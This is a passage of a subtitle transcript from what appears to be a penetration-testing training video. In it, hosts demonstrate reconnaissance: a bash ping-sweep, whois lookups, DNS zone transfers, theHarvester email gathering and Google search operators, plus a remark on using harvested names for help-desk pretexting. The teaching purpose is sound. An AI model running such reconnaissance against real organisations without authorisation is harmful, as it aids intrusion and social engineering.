that.\n\n160\n00:07:33.180 --> 00:07:38.861\nCat p, I'll do a nano so\nwe get the colors, psweep.\n\n161\n00:07:38.861 --> 00:07:40.730\nNot a very long script.\n\n162\n00:07:40.730 --> 00:07:42.712\nIt's a very short script, very easy.\n\n163\n00:07:42.712 --> 00:07:47.150\nThis Kali box, for whatever reason,\ngives me headaches with the script.\n\n164\n00:07:47.150 --> 00:07:48.265\nIt does not like the script.\n\n165\n00:07:48.265 --> 00:07:50.630\n&gt;&gt; [LAUGH]\n&gt;&gt; Every other box that I created this on,\n\n166\n00:07:50.630 --> 00:07:51.660\nit works fantastic.\n\n167\n00:07:51.660 --> 00:07:53.600\nBut this one, it just hates it.\n\n168\n00:07:53.600 --> 00:07:55.853\nBut basically all I'm doing is a for-loop.\n\n169\n00:07:55.853 --> 00:07:59.932\nSo for, this variable, and\nsequence 1 through 254.\n\n170\n00:07:59.932 --> 00:08:01.228\nSo I'm scanning a range.\n\n171\n00:08:01.228 --> 00:08:05.892\nFrom 1 to 254 just sounds like\na class C address for me.\n\n172\n00:08:05.892 --> 00:08:07.860\nI could change it to whatever I want.\n\n173\n00:08:07.860 --> 00:08:10.080\nI'm doing this sleep because\nbasically it's running so\n\n174\n00:08:10.080 --> 00:08:11.650\nfast it's confusing the CPU.\n\n175\n00:08:11.650 --> 00:08:13.540\n&gt;&gt; It'll trip over itself basically.\n\n176\n00:08:13.540 --> 00:08:17.720\n&gt;&gt; Yeah, it's dragging its tongue and\nits ears and it's tripping over it.\n\n177\n00:08:17.720 --> 00:08:19.590\nSo I sleep it for\na very short amount of time so\n\n178\n00:08:19.590 --> 00:08:22.070\nit has enough time to keep processing.\n\n179\n00:08:22.070 --> 00:08:24.920\nAnd then it's just a ping -c,\na continuous ping.\n\n180\n00:08:24.920 --> 00:08:27.010\nHow many, or\nI'm sorry not continuous, the count.\n\n181\n00:08:27.010 --> 00:08:27.970\nHow many pings do I wanna do?\n\n182\n00:08:27.970 --> 00:08:29.800\nI just wanna do one.\n\n183\n00:08:29.800 --> 00:08:32.810\nAnd then it gets its variable here.\n\n184\n00:08:32.810 --> 00:08:36.730\nI grep that, I'm looking for\n64 because when I do a ping,\n\n185\n00:08:36.730 --> 00:08:41.000\n64 is the very first character\nthat shows up on a good ping.\n\n186\n00:08:41.000 --> 00:08:45.140\nSo if it replies, that's the very first\ncharacter, that's what grep is happening.\n\n187\n00:08:45.140 --> 00:08:48.710\nIf the line starts with 64, good.\n\n188\n00:08:48.710 --> 00:08:55.050\nCut the field which is just an empty, like\na space, and what field, it's number four.\n\n189\n00:08:55.050 --> 00:08:58.010\nAnd then throw that process in the\nbackground so that I can run another one,\n\n190\n00:08:58.010 --> 00:08:58.760\nand I'm doing this as a loop.\n\n191\n00:08:58.760 --> 00:09:03.122\nSo that's my little scripts,\nlet's see if it actually gives me fits or\n\n192\n00:09:03.122 --> 00:09:05.171\nwhat, hopefully it runs right.\n\n193\n00:09:05.171 --> 00:09:08.998\nI've got it down to running about\nseven seconds, it's not n-map fast.\n\n194\n00:09:08.998 --> 00:09:10.090\nBut it's not too bad.\n\n195\n00:09:10.090 --> 00:09:10.660\n&gt;&gt; It's pretty close.\n\n196\n00:09:10.660 --> 00:09:12.815\n&gt;&gt; Yeah it's about as fast I've done it,\nso let's do that.\n\n197\n00:09:12.815 --> 00:09:14.744\n/pingsweep.sh.\n\n198\n00:09:14.744 --> 00:09:17.330\nPingsweep where's my s?\n\n199\n00:09:17.330 --> 00:09:17.870\nThere it is.\n\n200\n00:09:17.870 --> 00:09:20.770\nThere it goes, firing away.\n\n201\n00:09:20.770 --> 00:09:24.360\nPlease don't crash on me my little script,\nwork for me.\n\n202\n00:09:24.360 --> 00:09:25.160\nIt's going, it's going.\n\n203\n00:09:25.160 --> 00:09:25.890\nHey it found, all right.\n\n204\n00:09:25.890 --> 00:09:28.893\nCome on, I know there's one more,\nthere we go.\n\n205\n00:09:28.893 --> 00:09:31.010\nSo it found a couple of IP addresses.\n\n206\n00:09:31.010 --> 00:09:33.660\nI notice one it did not find,\nwhich one was it?\n\n207\n00:09:33.660 --> 00:09:36.610\nThat must have been an old entry or\nsomething.\n\n208\n00:09:36.610 --> 00:09:44.041\nLet's see, ping 192.168.219.152.\n\n209\n00:09:44.041 --> 00:09:46.240\nIt did find that one,\nyeah, so it's not up.\n\n210\n00:09:46.240 --> 00:09:50.780\nSo I must have had like an ARP,\nit must have been an ARP thing with NMAP.\n\n211\n00:09:50.780 --> 00:09:53.660\nYou've got to remember\nNMAP tries to be thorough.\n\n212\n00:09:53.660 --> 00:09:56.920\nIt looked at my ARP table and\nsaid well, you connected this earlier.\n\n213\n00:09:56.920 --> 00:09:58.930\nI assume it's still alive.\n\n214\n00:09:58.930 --> 00:09:59.910\nAnd there you go.\n\n215\n00:09:59.910 --> 00:10:02.880\nSo maybe you want to go\nwith a custom script,\n\n216\n00:10:02.880 --> 00:10:06.420\nbecause I got only the machines\nthat are actually alive.\n\n217\n00:10:06.420 --> 00:10:09.270\nAnd I had to tell it,\ndon't do ARP, only do ping.\n\n218\n00:10:09.270 --> 00:10:13.020\nSo you gotta remember, learn your tools or\ncreate your own custom script.\n\n219\n00:10:13.020 --> 00:10:15.310\nSo I did a ping sweep\nof that entire network.\n\n220\n00:10:15.310 --> 00:10:18.411\n&gt;&gt; Yeah, and a really great look, too,\nat the grep and the cut commands.\n\n221\n00:10:18.411 --> 00:10:22.746\nAnd how we can use those with our tools to\nformat that output into something I might\n\n222\n00:10:22.746 --> 00:10:25.130\nthen turn around and use somewhere else.\n\n223\n00:10:25.130 --> 00:10:27.770\nKeep just the information you want.\n\n224\n00:10:27.770 --> 00:10:29.090\n&gt;&gt; That's exactly right.\n\n225\n00:10:29.090 --> 00:10:34.557\nAll right, let's talk about more\nInternet stuff, and DNS specifically.\n\n226\n00:10:34.557 --> 00:10:37.196\nSo DNS is a great service, we like DNS.\n\n227\n00:10:37.196 --> 00:10:39.603\nDNS can actually give up\na lot of information,\n\n228\n00:10:39.603 --> 00:10:42.147\nsome information that\nit probably shouldn't.\n\n229\n00:10:42.147 --> 00:10:46.230\nAnd nowadays it doesn't usually, okay?\n\n230\n00:10:46.230 --> 00:10:48.000\nIf it does, you've done a great thing.\n\n231\n00:10:48.000 --> 00:10:49.520\nIt's called a zone transfer.\n\n232\n00:10:49.520 --> 00:10:54.370\nIf it does a zone transfer,\nyou're basically saying, hey, DNS server,\n\n233\n00:10:54.370 --> 00:10:58.650\nwould you mind giving me every\nrecord of everything that you have?\n\n234\n00:10:58.650 --> 00:11:01.840\nI mean, I just wanna see it, that's all.\n\n235\n00:11:01.840 --> 00:11:02.880\n&gt;&gt; You can trust me.\n\n236\n00:11:02.880 --> 00:11:05.790\n&gt;&gt; Yeah, you might see where\nthat's probably not a good thing\n\n237\n00:11:05.790 --> 00:11:06.940\nthat it would do that.\n\n238\n00:11:06.940 --> 00:11:10.660\nBecause it's basically saying,\nhere's every host I have a record for.\n\n239\n00:11:10.660 --> 00:11:14.180\nAnd now you have a definitive list\nof every host it has a record for.\n\n240\n00:11:14.180 --> 00:11:16.525\nIf I'm doing this against DNS server for\n\n241\n00:11:16.525 --> 00:11:20.250\nMicrosoft.com it's gonna\ntell me every host.\n\n242\n00:11:20.250 --> 00:11:24.780\nSo typically, when you try to do a full\nzone transfer, it's not gonna happen.\n\n243\n00:11:24.780 --> 00:11:26.280\nYou can do this with endmap,\n\n244\n00:11:26.280 --> 00:11:29.490\nyou can do this with a whois query,\ngreat way to do it.\n\n245\n00:11:29.490 --> 00:11:31.960\nDig is another great tool for that.\n\n246\n00:11:31.960 --> 00:11:34.350\nWhat's another one, host-\n&gt;&gt; Nslookup.\n\n247\n00:11:34.350 --> 00:11:35.440\n&gt;&gt; Yeah, nslookup, right.\n\n248\n00:11:35.440 --> 00:11:37.910\nIt has been around forever,\neverybody can do it.\n\n249\n00:11:37.910 --> 00:11:40.080\nVery simple, play around with those.\n\n250\n00:11:40.080 --> 00:11:47.240\nI found one [INAUDIBLE] show you any\nof them, I mean let's do a whois.\n\n251\n00:11:47.240 --> 00:11:49.340\nTake a look,\nobviously there's a lot of options here.\n\n252\n00:11:49.340 --> 00:11:51.701\nI think you just have to give it the host,\nyeah.\n\n253\n00:11:51.701 --> 00:11:56.740\nJust -h, what host you want,\nand you're off to the races.\n\n254\n00:11:56.740 --> 00:12:03.139\nSo let's try that,\nsay whois -h microsoft.com.\n\n255\n00:12:03.139 --> 00:12:05.058\nI'm not plugged into the network here.\n\n256\n00:12:05.058 --> 00:12:11.382\nLet me actually connect to the Internet so\nthat it can work.\n\n257\n00:12:11.382 --> 00:12:15.886\nNow remember, if you're in an internal\nLAN and have a DNS server that's local,\n\n258\n00:12:15.886 --> 00:12:17.421\nthat would have been fine.\n\n259\n00:12:17.421 --> 00:12:22.465\nBut I don't so, I want to show\nyou something, so let's do that.\n\n260\n00:12:22.465 --> 00:12:25.934\nMicrosoft.com.\n\n261\n00:12:25.934 --> 00:12:30.070\nLet's see, it doesn't like that,\nlet me get rid of that.\n\n262\n00:12:30.070 --> 00:12:33.490\nMicrosoft.com, I spelled it correctly.\n\n263\n00:12:33.490 --> 00:12:33.990\nMaybe I don't need the -h, there we go.\n\n264\n00:12:35.660 --> 00:12:39.520\nAnd so it starts giving me a lot of\ninformation about microsoft.com.\n\n265\n00:12:39.520 --> 00:12:41.790\nA lot of really good information\nthat might be in here.\n\n266\n00:12:42.890 --> 00:12:47.920\nBack in the day people,\nwould put here's the sysadmin's name and\n\n267\n00:12:47.920 --> 00:12:51.230\nemail address, phone number,\nroom number, all that.\n\n268\n00:12:51.230 --> 00:12:53.850\nYou'll see all this\ninformation is in here.\n\n269\n00:12:53.850 --> 00:12:55.390\nLook at that, there's the street address.\n\n270\n00:12:55.390 --> 00:12:59.371\n1 Microsoft Way, Redmond,\nWashington 98052.\n\n271\n00:12:59.371 --> 00:13:01.608\nThere's their phone numbers.\n\n272\n00:13:01.608 --> 00:13:05.125\n&gt;&gt; Yeah, in a lot of organizations,\nif they made their registration.\n\n273\n00:13:05.125 --> 00:13:08.608\nCuz this is basically looking\nin the registrar databases for\n\n274\n00:13:08.608 --> 00:13:13.290\nthe Internet when you register like i\nwant to own or register mikerodrick.com.\n\n275\n00:13:13.290 --> 00:13:17.190\nI make that registration through a\nreseller or through one of the registrars\n\n276\n00:13:17.190 --> 00:13:19.660\ndirectly, and\nthey keep that database of information.\n\n277\n00:13:19.660 --> 00:13:20.410\nAnd it used to be,\n\n278\n00:13:20.410 --> 00:13:23.890\nas you said, we provide all kinds of\ninformation in that registration.\n\n279\n00:13:23.890 --> 00:13:28.300\nWho to contact, what our mailing\naddress was, what our fax number was.\n\n280\n00:13:28.300 --> 00:13:33.330\nWe've gotten wiser these days and a lot of\nthem are now doing private registrations,\n\n281\n00:13:33.330 --> 00:13:35.130\nwhere we hide a lot of that information.\n\n282\n00:13:35.130 --> 00:13:37.990\nBut definitely a great place to start,\nbecause you don't know, and\n\n283\n00:13:37.990 --> 00:13:39.780\nyou need to find information.\n\n284\n00:13:39.780 --> 00:13:43.710\nThis is publicly available information,\nwe're not breaking any laws, any rules.\n\n285\n00:13:43.710 --> 00:13:47.450\nWe're just using whois to query\nthat registar database and\n\n286\n00:13:47.450 --> 00:13:50.020\nsee what information we can start\npulling back on our targets.\n\n287\n00:13:50.020 --> 00:13:50.880\n&gt;&gt; That's it.\n\n288\n00:13:50.880 --> 00:13:53.223\nAnd that's the cool thing about this,\n\n289\n00:13:53.223 --> 00:13:56.642\nis right now we're being very\npassive in our discovery.\n\n290\n00:13:56.642 --> 00:13:59.560\nAll right, there's active scanning and\nthere's passive scanning.\n\n291\n00:13:59.560 --> 00:14:00.780\nRight now we're being very passive.\n\n292\n00:14:00.780 --> 00:14:05.060\nWe're just asking for freely available\ninformation that they give out.\n\n293\n00:14:05.060 --> 00:14:09.200\nAnd through that information\nwe start to build a picture\n\n294\n00:14:09.200 --> 00:14:10.860\nof the systems that we're going after.\n\n295\n00:14:10.860 --> 00:14:14.070\nSo that's gonna be helpful for\nyou as you continue.\n\n296\n00:14:14.070 --> 00:14:20.020\n&gt;&gt; Another one that I know used to be done\na lot in the past, it's not done as much.\n\n297\n00:14:20.020 --> 00:14:23.500\nBut email addresses that\nwe would put on websites.\n\n298\n00:14:23.500 --> 00:14:27.350\nAre there tools I could use to\nstart gathering that information?\n\n299\n00:14:27.350 --> 00:14:30.920\n&gt;&gt; Yeah, that's actually really good\ninformation because think about it.\n\n300\n00:14:30.920 --> 00:14:33.460\nIf you're at a company or you have or\nmaybe you're in school or\n\n301\n00:14:33.460 --> 00:14:34.450\nsomething like that.\n\n302\n00:14:34.450 --> 00:14:37.310\nThey typically will give you\nan email address, right?\n\n303\n00:14:37.310 --> 00:14:40.410\nThat email address is also your user name,\nright?\n\n304\n00:14:40.410 --> 00:14:46.040\nSo that's a good way to start enumerating\nuser names for systems is looking for\n\n305\n00:14:46.040 --> 00:14:49.990\nemail addresses that aren't\nlike system@mycompany.com.\n\n306\n00:14:49.990 --> 00:14:53.000\n&gt;&gt; Or if I want to start doing\nsome social engineering.\n\n307\n00:14:53.000 --> 00:14:57.620\nIts easy to call somebody at\nthe help desk or one of these users.\n\n308\n00:14:57.620 --> 00:15:00.430\nI've got the email address of some\nof their IT guys, I can try to\n\n309\n00:15:00.430 --> 00:15:04.050\nuse those names, make it sound like I\nwork there and get a lot of headway.\n\n310\n00:15:04.050 --> 00:15:06.070\n&gt;&gt; I actually tried to do\nthat to get a job one time.\n\n311\n00:15:06.070 --> 00:15:06.630\n&gt;&gt; Did you?\n&gt;&gt; Yeah,\n\n312\n00:15:06.630 --> 00:15:11.680\nwhen I was fresh out of school and\nI was like it's a security job.\n\n313\n00:15:11.680 --> 00:15:12.770\nThat'd be awesome.\n\n314\n00:15:12.770 --> 00:15:15.180\nSo I did a look up and\nthere was the guy, right?\n\n315\n00:15:15.180 --> 00:15:18.920\nI couldn't get a hold of anybody,\nno one would return a phone call.\n\n316\n00:15:18.920 --> 00:15:20.930\nSo it was apparently a who\nyou know kind of thing.\n\n317\n00:15:20.930 --> 00:15:21.490\n&gt;&gt; Right.\n\n318\n00:15:21.490 --> 00:15:24.495\n&gt;&gt; So I found out who the guy\nregistered and his phone number and\n\n319\n00:15:24.495 --> 00:15:25.325\nI called him directly.\n\n320\n00:15:25.325 --> 00:15:26.755\nAnd I was like, hey yeah,\nI'm calling about the job.\n\n321\n00:15:26.755 --> 00:15:28.014\nHe said, how did you get this number?\n\n322\n00:15:28.014 --> 00:15:28.988\n&gt;&gt; [LAUGH]\n&gt;&gt; I said well,\n\n323\n00:15:28.988 --> 00:15:30.375\nit is a security job, right?\n\n324\n00:15:30.375 --> 00:15:33.749\nI wanted to show you that I'm\ngood at security and you're not.\n\n325\n00:15:33.749 --> 00:15:35.594\n&gt;&gt; [LAUGH]\n&gt;&gt; I didn't get that job,\n\n326\n00:15:35.594 --> 00:15:37.865\nnot even a call back, I don't know why.\n\n327\n00:15:37.865 --> 00:15:40.965\nBut yeah, so a lot of fun there.\n\n328\n00:15:40.965 --> 00:15:44.665\nAll right, but Mike's point was,\nemail addresses, can we gather those?\n\n329\n00:15:44.665 --> 00:15:48.549\nYeah, there's a cool tool,\nI love saying that, called the harvester.\n\n330\n00:15:48.549 --> 00:15:52.716\nAnd not the Metallica song The Harvester\nof Sorrows, Language of the Mad.\n\n331\n00:15:52.716 --> 00:15:57.478\nNo, it is the harvester of harvesting\nemail addresses.\u007f Very cool, and\n\n332\n00:15:57.478 --> 00:15:59.224\nit's a command line tool.\n\n333\n00:15:59.224 --> 00:16:05.860\nLet me clear my screen, and let's see\nhow the good old harvester works.\n\n334\n00:16:05.860 --> 00:16:10.140\nSo, I can do theharvester, all one word,\n\n335\n00:16:10.140 --> 00:16:15.570\nharvester, kind of looks weird when\nyou type it all out like that, dash d.\n\n336\n00:16:15.570 --> 00:16:17.860\nAnd then say something like microsoft.com.\n\n337\n00:16:17.860 --> 00:16:20.570\nAll right, we've been playing\nwith Microsoft, so we'll do that.\n\n338\n00:16:20.570 --> 00:16:23.300\nI'm going to limit this to 20 results,\nmaybe make it 30.\n\n339\n00:16:23.300 --> 00:16:26.480\nGet a little extra on it.\n\n340\n00:16:26.480 --> 00:16:27.520\nAnd then dash b.\n\n341\n00:16:27.520 --> 00:16:32.210\nThis is basically your crawler,\nyour searcher.\n\n342\n00:16:32.210 --> 00:16:33.560\nWhich one do you want to use?\n\n343\n00:16:33.560 --> 00:16:39.808\nIt's got quite a few that you can use like\nGoogle, Bing, I think PGP is one of them.\n\n344\n00:16:39.808 --> 00:16:41.180\n[CROSSTALK] Yes,\nthere's a bunch on the list.\n\n345\n00:16:41.180 --> 00:16:42.457\nWe'll take a look, let's just run this.\n\n346\n00:16:42.457 --> 00:16:44.449\nI'm gonna do all of them,\nI'm just gonna crank them.\n\n347\n00:16:44.449 --> 00:16:46.794\nGive me an all, hit Return.\n\n348\n00:16:46.794 --> 00:16:50.030\nHarvester gives us cool ASCII art.\n\n349\n00:16:50.030 --> 00:16:51.800\nThank you, boys, for\nthe awesome ASCII art.\n\n350\n00:16:51.800 --> 00:16:52.450\nWe appreciate that.\n\n351\n00:16:52.450 --> 00:16:55.079\n&gt;&gt; Now you can see PGP Server,\nyeah, is one of the sources.\n\n352\n00:16:56.360 --> 00:16:57.210\nAnd it's cranking away.\n\n353\n00:16:57.210 --> 00:17:01.000\n&gt;&gt; It shouldn't take, depending, this\nis why I limited this thing to just 30,\n\n354\n00:17:01.000 --> 00:17:05.200\nbecause Microsoft's a big entity this\nscan would, if I just did dash all and\n\n355\n00:17:05.200 --> 00:17:08.910\nlet it go, let it rip,\nprobably would take a long time scanning.\n\n356\n00:17:08.910 --> 00:17:11.898\nAnother one of those things we\nlike to let you know, I love it,\n\n357\n00:17:11.898 --> 00:17:17.030\nyou watch trending and they say yeah, use\nthis tool, and you get the information.\n\n358\n00:17:17.030 --> 00:17:18.740\nYeah.\nSometimes using that tool and\n\n359\n00:17:18.740 --> 00:17:21.500\ngetting that information\ncan take a long time.\n\n360\n00:17:21.500 --> 00:17:22.470\nThis is one of those times.\n\n361\n00:17:22.470 --> 00:17:23.900\nIt could take a very long time.\n\n362\n00:17:23.900 --> 00:17:25.530\nSo you have to understand.\n\n363\n00:17:25.530 --> 00:17:29.160\nNow the good thing is as a hacker,\ntime is usually on your side.\n\n364\n00:17:29.160 --> 00:17:32.440\nAs a penetration tester, you're\ndoing as a living, time might not so\n\n365\n00:17:32.440 --> 00:17:35.820\nmuch be on your side should you need\nto expediate things if you can.\n\n366\n00:17:35.820 --> 00:17:38.610\nBut, we've got a lot of information here.\n\n367\n00:17:38.610 --> 00:17:41.788\nLook at what we've discovered.\n\n368\n00:17:41.788 --> 00:17:45.120\nLots of interesting stuff\nhere to be honest with you.\n\n369\n00:17:47.380 --> 00:17:49.750\n&gt;&gt; Yeah, some of the stuff it\npulls back seems rather random.\n\n370\n00:17:49.750 --> 00:17:51.440\n&gt;&gt; It does seem rather random.\n\n371\n00:17:51.440 --> 00:17:54.930\nThese are probably, like websites that\nare associated with Microsoft.com or\n\n372\n00:17:54.930 --> 00:17:55.960\n&gt;&gt; That have some\n\n373\n00:17:55.960 --> 00:17:57.430\nreference to-\n&gt;&gt; Yes.\n\n374\n00:17:57.430 --> 00:18:00.710\nI want to get to where\nthe email addresses are.\n\n375\n00:18:00.710 --> 00:18:02.040\nWay in the top here.\n\n376\n00:18:02.040 --> 00:18:03.150\nI should have went with 20 but I did not.\n\n377\n00:18:03.150 --> 00:18:07.370\nNow you are starting to see\nmore Microsoft.com stuff,\n\n378\n00:18:07.370 --> 00:18:11.040\nhosts found in search engines,\nemails found.\n\n379\n00:18:11.040 --> 00:18:13.350\nNow here is the good stuff.\n\n380\n00:18:13.350 --> 00:18:15.415\nSo we got '@microsoft.com or\n\n381\n00:18:15.415 --> 00:18:20.010\nsingle quote at microsoft.com I\nwonder what that does, right?\n\n382\n00:18:20.010 --> 00:18:21.910\nThis should start your wheels a turning.\n\n383\n00:18:21.910 --> 00:18:25.440\nI actually really am interested in finding\nout what the heck that apostrophe,\n\n384\n00:18:25.440 --> 00:18:27.860\nwhere does that email go?\n\n385\n00:18:27.860 --> 00:18:32.430\njava@microsoft.com, so maybe you're\nhaving Java errors with Microsoft here.\n\n386\n00:18:32.430 --> 00:18:35.270\nOpen source, what's the zhang.\n\n387\n00:18:35.270 --> 00:18:37.020\nThat's probably a user.\n\n388\n00:18:37.020 --> 00:18:39.210\nThat's somebody that works at Microsoft.\n\n389\n00:18:39.210 --> 00:18:41.310\nThere's their IP address.\n\n390\n00:18:41.310 --> 00:18:43.130\nProbably also their user name.\n\n391\n00:18:43.130 --> 00:18:45.090\nSo, if I was targeting a system.\n\n392\n00:18:45.090 --> 00:18:48.130\nNow I at least have what\nis most likely a username.\n\n393\n00:18:48.130 --> 00:18:50.170\nSo I start to build that list.\n\n394\n00:18:50.170 --> 00:18:53.900\nGood stuff there and just to be thorough,\nlet's see what else they found.\n\n395\n00:18:53.900 --> 00:18:54.830\nFull harvest in Google.\n\n396\n00:18:54.830 --> 00:18:56.380\nOkay, good.\nYeah, we hit the top of the page there.\n\n397\n00:18:57.660 --> 00:19:00.150\nSo the harvester can do that for you.\n\n398\n00:19:00.150 --> 00:19:02.500\nLet's scroll on down,\nI can just hit enter a few times.\n\n399\n00:19:02.500 --> 00:19:03.130\nThere we go.\n\n400\n00:19:03.130 --> 00:19:03.650\nWhere we at?\n\n401\n00:19:03.650 --> 00:19:09.860\nSo that was emails, DNS,\nall good things, Google hacking.\n\n402\n00:19:09.860 --> 00:19:10.840\nRight, don't forget Google.\n\n403\n00:19:10.840 --> 00:19:12.870\nThat's your friend,\nour friend Adam Gordon,\n\n404\n00:19:12.870 --> 00:19:15.565\nhe loves to call it the Oracle of\nthe Internet cuz it knows everything.\n\n405\n00:19:15.565 --> 00:19:16.970\n&gt;&gt; [LAUGH]\n&gt;&gt; I'd be\n\n406\n00:19:16.970 --> 00:19:18.970\nhard pressed to tell him he's\nwrong on that, fact be known.\n\n407\n00:19:18.970 --> 00:19:24.162\nThere's a lot of information you\ncan glean from Google itself.\n\n408\n00:19:24.162 --> 00:19:28.650\nA lot of sites, ITProTV,\nwe are a public entity,\n\n409\n00:19:28.650 --> 00:19:32.610\nwe want you to find us,\nwe want you to come to our site.\n\n410\n00:19:32.610 --> 00:19:33.510\nSo, what do we do?\n\n411\n00:19:33.510 --> 00:19:38.300\nWe make ourselves out there on\nthe Internet, we try to push our product.\n\n412\n00:19:38.300 --> 00:19:39.500\nA lot of companies do the same thing.\n\n413\n00:19:39.500 --> 00:19:44.636\nThey have a public facing\nface I guess to be redundant.\n\n414\n00:19:44.636 --> 00:19:47.150\n&gt;&gt; [LAUGH]\n&gt;&gt; Right they are facing the public.\n\n415\n00:19:47.150 --> 00:19:48.880\nWe want you to see us.\n\n416\n00:19:48.880 --> 00:19:50.540\nWell I can get a lot of\ninformation from that.\n\n417\n00:19:50.540 --> 00:19:51.910\nI can find things.\n\n418\n00:19:51.910 --> 00:19:52.800\nThrow a harvester at it.\n\n419\n00:19:52.800 --> 00:19:54.910\nFind some email address, right?\n\n420\n00:19:54.910 --> 00:19:57.260\nI can maybe look do you have any PDF's?\n\n421\n00:19:57.260 --> 00:19:59.300\nDo you have any hidden files?\n\n422\n00:19:59.300 --> 00:20:03.310\nIf I just wanna search your site\nspecifically for something.\n\n423\n00:20:03.310 --> 00:20:06.120\nMaybe something I found that\ncould be a vulnerability.\n\n424\n00:20:06.120 --> 00:20:09.350\nMaybe you do webcams.\n\n425\n00:20:09.350 --> 00:20:12.080\nYou resell webcams,\nyou refurbish them and sell webcams.\n\n426\n00:20:13.600 --> 00:20:15.430\nHere's our models.\n\n427\n00:20:15.430 --> 00:20:18.590\nWell, if you refurbish them,\nodds are you might be using them.\n\n428\n00:20:18.590 --> 00:20:19.780\nI can look in your site.\n\n429\n00:20:19.780 --> 00:20:21.120\nDoes that exist?\n\n430\n00:20:21.120 --> 00:20:25.140\nRight?\nSo you use things like the site in URL,\n\n431\n00:20:25.140 --> 00:20:27.690\nin file, or file type, should I say?\n\n432\n00:20:28.760 --> 00:20:32.660\nThings of that nature with Google\nto get a lot of information.\n\n433\n00:20:32.660 --> 00:20:36.550\nLet's pick on Microsoft some more and\nlet's see what goes on here.\n\n434\n00:20:36.550 --> 00:20:37.820\nJust opening up a web browser,\n\n435\n00:20:37.820 --> 00:20:41.770\ngoing to, I haven't Google\nis my default search engine.\n\n436\n00:20:41.770 --> 00:20:47.476\nSo I can just go to my search bar and\nsay, site,\n\n437\n00:20:47.476 --> 00:20:53.315\ncolon, Microsoft.\n\n438\n00:20:53.315 --> 00:20:56.140\nRealsoft.com.\n\n439\n00:20:56.140 --> 00:20:59.000\nThere we go.\nWe get Microsoft Notice\n\n440\n00:20:59.000 --> 00:21:01.966\neverything has Microsoft.com.\n\n441\n00:21:01.966 --> 00:21:06.360\nMicrosoft.com, I get nothing\nthat's not Microsoft.com.\n\n442\n00:21:06.360 --> 00:21:07.650\nIf I wanna exclude one of those,\n\n443\n00:21:07.650 --> 00:21:10.800\nI can say minus site whatever\nexclusions I wanna make.\n\n444\n00:21:10.800 --> 00:21:12.330\nSo www.microsoft.com.\n\n445\n00:21:12.330 --> 00:21:15.010\nDon't care about their public website.\n\n446\n00:21:15.010 --> 00:21:19.170\nGive me something that's not so\nclose to the surface.\n\n447\n00:21:19.170 --> 00:21:21.060\n&gt;&gt; I use this all the time\njust in my daily surfing,\n\n448\n00:21:21.060 --> 00:21:24.980\nlike I want to look up something on, let's\nsay, Windows deployment services, and when\n\n449\n00:21:24.980 --> 00:21:29.650\nI do a search on that, depending on, you\nknow, what search engine, you get results\n\n450\n00:21:29.650 --> 00:21:34.880\nfrom Microsoft as well as many blogs and\narticles that other people have written.\n\n451\n00:21:34.880 --> 00:21:35.800\nI want it from Microsoft.\n\n452\n00:21:35.800 --> 00:21:37.330\nI want to hear it from the horse's mouth.\n\n453\n00:21:37.330 --> 00:21:38.980\nI'm not looking for anybody's opinion.\n\n454\n00:21:38.980 --> 00:21:43.760\nI want, maybe I'm looking for\na particular requirement or what have you.\n\n455\n00:21:43.760 --> 00:21:49.850\nYou can do that, site:technet, and now all\nmy results will come, just from technet.\n\n456\n00:21:49.850 --> 00:21:51.960\nAnd it's a great way to\nfilter your results.\n\n457\n00:21:51.960 --> 00:21:55.010\nAnd just to clarify one thing Daniel said\nthere, when he says, Google hacking.\n\n458\n00:21:55.010 --> 00:21:58.870\nI know most of us understand what that\nmeans but we're not hacking Google.\n\n459\n00:21:58.870 --> 00:21:59.550\nRight?\n[INAUDIBLE]\n\n460\n00:21:59.550 --> 00:22:00.780\n&gt;&gt; Good call Mike.\n\n461\n00:22:00.780 --> 00:22:03.270\n&gt;&gt; Yeah it does sound like that\nlets do some Google hacking.\n\n462\n00:22:03.270 --> 00:22:04.760\nWe're not hacking Google.\n\n463\n00:22:04.760 --> 00:22:07.960\nWe're using Google to\nfacilitate the hacking.\n\n464\n00:22:07.960 --> 00:22:08.490\nRight?\nOr\n\n465\n00:22:08.490 --> 00:22:10.980\npenetration testing I guess\nwould be a better way to say it.\n\n466\n00:22:10.980 --> 00:22:14.280\nBut they've got the search engines,\nthey've got all of the stuff\n\n467\n00:22:14.280 --> 00:22:18.930\nindexed they can find it, and\nwhat a lot of people don't realize is that\n\n468\n00:22:18.930 --> 00:22:22.830\nwhen you put stuff out on the web,\nit's gonna be found by these spiders.\n\n469\n00:22:22.830 --> 00:22:26.370\nI mean there are ways to block\nthings from those spiders,\n\n470\n00:22:26.370 --> 00:22:28.560\nbut most people don't realize that either.\n\n471\n00:22:28.560 --> 00:22:31.070\nSo people will put things\nout there on the web,\n\n472\n00:22:31.070 --> 00:22:33.080\nthat they don't think\nanybody else is gonna see.\n\n473\n00:22:33.080 --> 00:22:37.020\nHey, I'm gonna have this page, and\nit's gonna have some of my things I\n\n474\n00:22:37.020 --> 00:22:41.390\nneed internally when I'm working, I'm not\ngoing to link to it from any other page so\n\n475\n00:22:41.390 --> 00:22:43.400\nthere's no way anybody's\never going to get to it.\n\n476\n00:22:43.400 --> 00:22:44.180\nJust me.\n\n477\n00:22:44.180 --> 00:22:45.620\nIt might have passwords on there.\n\n478\n00:22:45.620 --> 00:22:47.000\nAccount names.\n\n479\n00:22:47.000 --> 00:22:48.980\nIP addresses things like that.\n\n480\n00:22:48.980 --> 00:22:49.610\nGuess what.\n\n481\n00:22:49.610 --> 00:22:51.640\nGoogle Spiders found it.\n\n482\n00:22:51.640 --> 00:22:56.060\nThey will crawl those pages and they will\nbe indexed and knowing the right search\n\n483\n00:22:56.060 --> 00:22:59.560\nterms to put in there, you can find\namazing things on the Internet.\n\n484\n00:22:59.560 --> 00:23:00.200\n&gt;&gt; Yeah, no doubt.\n\n485\n00:23:00.200 --> 00:23:02.680\nGoogle is a crazy, crazy, insane thing.\n\n486\n00:23:02.680 --> 00:23:07.110\nThat if you really learn how to use\nGoogle, man you're a dangerous person.\n\n487\n00:23:07.110 --> 00:23:09.710\nCuz you'll be able to find information\nnobody even knew was there.\n\n488\n00:23:09.710 --> 00:23:10.920\nIt's a crazy thing.\n\n489\n00:23:10.920 --> 00:23:14.520\nSo check that out, learn how to use\nGoogle, so that when you are working with\n\n490\n00:23:14.520 --> 00:23:19.960\na publically facing organization, you can\nglean a lot of information through that.\n\n491\n00:23:19.960 --> 00:23:22.340\nAll right,\nlet's talk about banner grabbing.\n\n492\n00:23:22.340 --> 00:23:23.550\nIt's an important concept.\n\n493\n00:23:23.550 --> 00:23:24.860\nYou gotta know banner 